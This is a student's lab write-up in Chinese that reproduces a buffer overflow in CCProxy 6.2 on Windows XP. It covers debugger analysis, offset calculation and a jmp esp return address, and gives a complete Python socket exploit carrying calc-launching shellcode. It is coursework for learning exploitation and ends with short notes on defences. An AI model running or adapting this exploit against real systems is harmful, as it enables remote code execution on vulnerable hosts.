# 缓冲区溢出实验

> CCProxy 6.2缓冲区溢出漏洞复现
>
> 孙晴 201818018670034

- 先布置实验环境，选择windows xp系统。需要关闭不可执行保护DEP，打开C：/boot.ini 然后将/noexecute改成/execute，然后重启就关闭了。
- 通过命令连接CCProxy

```
telnet localhost 23
```

![1555761274600](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555761274600.png)

- 正常的使用是ping 127.0.0.1 这种命令来进行，但是当ping后边的参数大于1000的时候就会产生栈溢出，触发crash。

![1555934967714](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555934967714.png)

- 继续分析，用命令行打开CCProxy(telnet localhost 23)。
- 打开windbg，选择attach to process选项，选择CCProxy的进程，然后输入g开始调试。

![1555935264701](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555935264701.png)

- 使用2000个a来执行ping命令，用windbg来查看一下各个寄存器的值。ping aaaaa(...)
- 看到windbg捕获了一个access violation，说明是程序在一个非法的地址上进行了执行，地址eip的值为0x61616161，也就是输入的aaaa。这里可以确定输入的数据会触发crash并且可以通过构造实现任意地址执行的错误。

![1555934865493](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555934865493.png)

- 接下来需要算一下缓冲区到ret地址处的偏移量是多少。
- 通过patternCreate.pl创建一个独特的序列，根据调试器显示的返回地址，就可以计算到buf到ret的距离。（这里使用老师上课用的1.txt，不单独构造新序列）

![1555935647461](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555935647461.png)

- 可以发现eip的位置是0x68423768，然后使用老师给的patternOffset.pl来计算0x68423768在2000个字节中的位置。是第1012个字节的位置。说明RET相对缓冲区的偏移大小是 1012字节；由于EBP占4字节，故存放局部变量的缓冲区大小为1008个字节。

![1555762368145](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555762368145.png)

- 使用1012个a+4个b，可以触发crash，并且ret的位置为0x62626262，正是bbbb。说明上述计算的偏移量没有问题。

  ![1555937178146](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555937178146.png)

- 这时就想要将ret的地址进行覆盖，覆盖的地址指向想要执行的代码开头部分，一般使用系统自带的jmp命令。这里使用的是jmp esp命令，使用windbg看一下0x7ffa4512，因此使用这个地址，只需要将构造的shellcode填充到栈中就可以了。

![1555936185331](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555936185331.png)

- 由于前面分析，ping后边接的字符串的1012的字节位置开始的4个字节将覆盖RET指针。
- 将这个位置填充 0x12，0x45，0xfa，0x7f 这四个字节，就可以实现控制流劫持。程序运行的时候就会转向地址 **0x7ffa4512** 执行jmp esp指令。
- 然后查看esp的位置在哪里，查看偏移量。

![1555936492381](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555936492381.png)

- 查看esp存储的数据是0x61413161，计算一下偏移量是在第四个字节的位置。因此将shellcode放在4字节的位置。


- 然后可以根据结构构造payload了。使用的是python语言，shellcode使用的是计算器执行的shellcode。


![1555768631784](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555768631784.png)

```
string = "PING "
shellcode =[
    0x33, 0xC0, 0x50, 0xB8, 0x2E, 0x64, 0x6C, 0x6C, 
    0x50, 0xB8, 0x65, 0x6C, 0x33, 0x32, 0x50, 0xB8, 
    0x6B, 0x65, 0x72, 0x6E, 0x50, 0x8B, 0xC4, 0x50, 
    0xB8, 0x7B, 0x1D, 0x80, 0x7C, 0xFF, 0xD0, 0x33, 
    0xC0, 0x50, 0xB8, 0x2E, 0x65, 0x78, 0x65, 0x50, 
    0xB8, 0x63, 0x61, 0x6C, 0x63, 0x50, 0x8B, 0xC4, 
    0x6A, 0x05, 0x50, 0xB8, 0xAD, 0x23, 0x86, 0x7C, 
    0xFF, 0xD0, 0x33, 0xC0, 0x50, 0xB8, 0xFA, 0xCA, 
    0x81, 0x7C, 0xFF, 0xD0
]
nop = 0x90
string += 4 * chr(nop)
for one in shellcode :
    string += chr(one)
string += (1008-len(shellcode)) * chr(nop)
string += chr(0x12) + chr(0x45) + chr(0xfa) + chr(0x7f)
string += "a" * 1000
string += "\r\n"
print string 
#print len(string)
```

- 由于产生的payload很多不可见字符，不能直接通过ping命令来实现攻击，因此需要使用socket编程，将字段通过socket.send字段来传输。完整的代码如下：

```
#!/usr/bin/env python
#coding:utf-8
import socket

def main():

    HOST = "localhost"
    PORT = 23
    ADDR = (HOST, PORT)
    sock = socket.socket()
    sock.connect(ADDR)
    ret_bytes = sock.recv(1024)
    ret_str = str(ret_bytes)
    print(ret_str)

    shellcode = "\x33\xc0\x50\xb8\x2e\x64\x6c\x6c\x50\xb8\x65\x6c\x33\x32"
    shellcode += "\x50\xb8\x6b\x65\x72\x6e\x50\x8b\xc4\x50\xb8\x7b\x1d\x80\x7c"
    shellcode += "\xff\xd0\x33\xc0\x50\xb8\x2e\x65\x78\x65\x50\xb8\x63\x61\x6c\x63"
    shellcode += "\x50\x8b\xc4\x6a\x05\x50\xb8\xad\x23\x86\x7c\xff\xd0\x33\xc0"
    shellcode += "\x50\xb8\xfa\xca\x81\x7c\xff\xd0"
    #print len(shellcode)

    payload = "PING "
    payload += "\x90\x90\x90\x90"
    payload += shellcode
    #print len(shellcode)
    for one in range(1012 - len(shellcode) - 4):
        payload += "\x90"

    #payload += "\x7b\x46\x86\x7c"
    payload += "\x12\x45\xfa\x7f"
    for one in range(0, 984):
        payload += "b"
    payload += "\r\n"

    sock.send(payload)

    sock.close()
  
if __name__ == '__main__':
    main()
```



- 最后的运行结果，引起了CCproxy的crash，并弹出了计算器

![1555988308481](C:\Users\varas\AppData\Roaming\Typora\typora-user-images\1555988308481.png)



- 防范的方法：

  在执行输入时进行严格的审查，超过缓冲区大小的直接不允许执行，开启DEP，加上地址随机化等等。

- 碰到的问题：

  由于做的是CCProxy的，根据教程一步一步做就可以了，然后shellcode之前也有接触过，直接使用网上找到的十六进制代码就可以，构造payload的python语言也非常熟悉，一开始用的xp环境存在一些问题，无法找到kernel32.dll文件，换了一个新的环境就可以实现了。

- 收获与体会：

  环境配置一直都是程序员最头疼的问题，每次都要环境配置好久，各种解决办法才能完成看起来不难的实验，但是在配置环境解决问题的过程中，又能更加的熟悉实验。从一开始的使用windbg要找教程，到一次一次的调试，一顿操作，也理解的更深刻了一些。

  虽然是最简单的缓冲区漏洞的利用，但是还是学到了很多东西，之前就从来没有用过windbg，也没有真的手动构造一个payload，这算是最宝贵的经验。